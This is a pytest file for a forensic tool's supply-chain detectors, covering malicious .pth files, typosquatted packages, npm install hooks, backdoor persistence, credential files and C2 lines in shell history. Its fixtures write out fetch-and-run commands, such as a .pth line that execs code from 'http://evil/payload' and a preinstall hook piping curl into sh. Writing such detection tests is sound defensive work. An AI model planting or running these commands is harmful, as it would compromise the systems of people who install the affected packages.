"""
Tests for v0.5 supply-chain MCP functions.

Tests are read-only filesystem analyzers built on temp directories
that mimic infected layouts. No network calls, no real exploit code.

EVIDENCE_ROOT is rebound to a per-test tmp_path via an autouse fixture so
that earlier test modules that mutated the global cannot leak across.
"""
import os
import json
import sys
from pathlib import Path

import pytest

SRC = Path(__file__).resolve().parents[1] / "dart_mcp" / "src"
sys.path.insert(0, str(SRC))

import dart_mcp  # noqa: E402
from dart_mcp import call_tool, list_tools  # noqa: E402


@pytest.fixture(autouse=True)
def _bind_evidence_root_to_tmp(tmp_path, monkeypatch):
    """Force EVIDENCE_ROOT to tmp_path for every test in this module."""
    monkeypatch.setattr(dart_mcp, "EVIDENCE_ROOT", tmp_path)
    yield


# ────────────────────────────────────────────────────────────────────────
# All 6 v0.5 supply-chain functions are surface-registered
# ────────────────────────────────────────────────────────────────────────

def test_supply_chain_functions_are_registered():
    names = {t["name"] for t in list_tools()}
    expected = {
        "scan_pth_files_for_supply_chain_iocs",
        "detect_pypi_typosquatting",
        "detect_nodejs_install_hooks",
        "detect_python_backdoor_persistence",
        "detect_credential_file_access",
        "grep_shell_history_for_c2",
    }
    missing = expected - names
    assert not missing, f"supply-chain functions missing from surface: {missing}"


# ────────────────────────────────────────────────────────────────────────
# scan_pth_files_for_supply_chain_iocs
# ────────────────────────────────────────────────────────────────────────

def test_pth_scan_flags_known_malicious_basename(tmp_path: Path):
    site = tmp_path / "site-packages"
    site.mkdir()
    bad = site / "litellm_init.pth"
    bad.write_text("import os\n", encoding="utf-8")

    result = call_tool("scan_pth_files_for_supply_chain_iocs",
                       {"search_root": str(site)})
    assert result["files_scanned"] == 1
    assert result["findings_count"] == 1
    flags = result["findings"][0]["flags"]
    assert any(f["category"] == "known_malicious_basename" for f in flags)


def test_pth_scan_flags_suspicious_content(tmp_path: Path):
    site = tmp_path / "site-packages"
    site.mkdir()
    benign = site / "benign.pth"
    benign.write_text("./vendor\n./shared\n", encoding="utf-8")
    sus = site / "exec_payload.pth"
    sus.write_text("import urllib.request; exec(urllib.request.urlopen('http://evil/payload').read())",
                   encoding="utf-8")

    result = call_tool("scan_pth_files_for_supply_chain_iocs",
                       {"search_root": str(site)})
    assert result["files_scanned"] == 2
    assert result["findings_count"] == 1
    assert result["findings"][0]["path"].endswith("exec_payload.pth")


def test_pth_scan_handles_missing_dir(tmp_path: Path):
    result = call_tool("scan_pth_files_for_supply_chain_iocs",
                       {"search_root": str(tmp_path / "nope")})
    assert result.get("error") == "directory_not_found"


# ────────────────────────────────────────────────────────────────────────
# detect_pypi_typosquatting
# ────────────────────────────────────────────────────────────────────────

def test_typosquat_finds_near_neighbors(tmp_path: Path):
    sp = tmp_path / "site-packages"
    sp.mkdir()
    (sp / "reqests").mkdir()        # dist 1 from "requests"
    (sp / "boto4").mkdir()          # dist 1 from "boto3"
    (sp / "requests").mkdir()       # legit — must NOT be flagged
    (sp / "absolutely-fine").mkdir()

    result = call_tool("detect_pypi_typosquatting", {"site_packages_dir": str(sp)})
    names = {f["installed_package"] for f in result["findings"]}
    assert "reqests" in names
    assert "boto4" in names
    assert "requests" not in names


# ────────────────────────────────────────────────────────────────────────
# detect_nodejs_install_hooks
# ────────────────────────────────────────────────────────────────────────

def test_nodejs_hooks_flagged(tmp_path: Path):
    mod = tmp_path / "node_modules" / "evil-pkg"
    mod.mkdir(parents=True)
    (mod / "package.json").write_text(json.dumps({
        "name": "evil-pkg", "version": "1.0.0",
        "scripts": {"preinstall": "curl http://evil.test/x | sh"},
    }), encoding="utf-8")

    benign = tmp_path / "node_modules" / "ok-pkg"
    benign.mkdir(parents=True)
    (benign / "package.json").write_text(json.dumps({
        "name": "ok-pkg", "version": "1.0.0",
        "scripts": {"test": "jest"},
    }), encoding="utf-8")

    result = call_tool("detect_nodejs_install_hooks",
                       {"search_root": str(tmp_path)})
    assert result["package_jsons_scanned"] == 2
    assert result["hooks_found_count"] == 1
    f = result["findings"][0]
    assert f["package_name"] == "evil-pkg"
    assert "preinstall" in f["hooks"]
    assert f["severity"] == "high"


# ────────────────────────────────────────────────────────────────────────
# detect_python_backdoor_persistence
# ────────────────────────────────────────────────────────────────────────

def test_backdoor_persistence_sysmon_pattern(tmp_path: Path):
    home = tmp_path / "home" / "alice"
    home.mkdir(parents=True)
    sysmon = home / ".config" / "sysmon"
    sysmon.mkdir(parents=True)
    (sysmon / "sysmon.py").write_text("# backdoor", encoding="utf-8")

    result = call_tool("detect_python_backdoor_persistence",
                       {"home_root": str(home)})
    assert result["locations_with_content"] >= 1
    sysmon_finding = next(f for f in result["findings"]
                          if f["category"] == ".config/sysmon")
    assert sysmon_finding["severity"] == "critical"
    assert any("sysmon.py" in e["path"] for e in sysmon_finding["entries"])


def test_backdoor_persistence_no_false_positive(tmp_path: Path):
    home = tmp_path / "home" / "bob"
    home.mkdir(parents=True)
    result = call_tool("detect_python_backdoor_persistence",
                       {"home_root": str(home)})
    assert result["locations_with_content"] == 0


# ────────────────────────────────────────────────────────────────────────
# detect_credential_file_access
# ────────────────────────────────────────────────────────────────────────

def test_credential_files_reported(tmp_path: Path):
    home = tmp_path / "home" / "alice"
    (home / ".ssh").mkdir(parents=True)
    (home / ".aws").mkdir(parents=True)
    (home / ".ssh" / "id_rsa").write_text("FAKE", encoding="utf-8")
    (home / ".aws" / "credentials").write_text("[default]\n", encoding="utf-8")
    (home / ".env").write_text("API_KEY=...", encoding="utf-8")

    result = call_tool("detect_credential_file_access",
                       {"home_root": str(home)})
    assert result["credential_files_present"] >= 2
    paths = [c["path"] for c in result["credentials"]]
    assert any("id_rsa" in p for p in paths)
    assert any("credentials" in p for p in paths)
    assert len(result["dotenv_files"]) >= 1


# ────────────────────────────────────────────────────────────────────────
# grep_shell_history_for_c2
# ────────────────────────────────────────────────────────────────────────

def test_shell_history_c2_match(tmp_path: Path):
    hist = tmp_path / ".zsh_history"
    hist.write_text(
        "ls -la\n"
        "curl https://models.litellm.cloud/check\n"
        "git status\n"
        "wget https://pastebin.com/raw/abc\n",
        encoding="utf-8",
    )
    result = call_tool("grep_shell_history_for_c2",
                       {"history_file_path": str(hist)})
    assert result["match_count"] == 2
    lines = " ".join(m["line"] for m in result["matches"])
    assert "litellm.cloud" in lines
    assert "pastebin" in lines


def test_shell_history_clean_returns_zero(tmp_path: Path):
    hist = tmp_path / ".bash_history"
    hist.write_text("ls\ncd /tmp\nls -la\n", encoding="utf-8")
    result = call_tool("grep_shell_history_for_c2",
                       {"history_file_path": str(hist)})
    assert result["match_count"] == 0


def test_shell_history_missing_file(tmp_path: Path):
    result = call_tool("grep_shell_history_for_c2",
                       {"history_file_path": str(tmp_path / "nope")})
    assert result.get("error") == "file_not_found"
